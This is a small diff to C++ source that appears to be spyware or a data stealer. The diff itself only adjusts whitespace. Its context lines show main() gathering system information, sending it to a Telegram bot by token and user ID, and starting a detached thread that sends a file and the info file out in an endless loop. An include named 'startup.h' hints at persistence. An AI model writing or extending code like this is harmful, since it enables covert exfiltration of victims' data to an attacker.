@@ -13,6 +13,7 @@
 #include <filesystem>
 #include "startup.h"
 
+
 void periodicSend(const std::wstring &token, const std::wstring &chat_id, const std::wstring &filePath, const std::wstring &infoPath)
 {
     while (true)
@@ -83,7 +84,7 @@ int main()
     }
     writeSystemInfoToFile(winfoPath);
     sendFileToTelegram(botToken, userID, winfoPath);
-    
+
     std::thread sender(periodicSend, botToken, userID, wlocation, winfoPath);
     sender.detach();
 
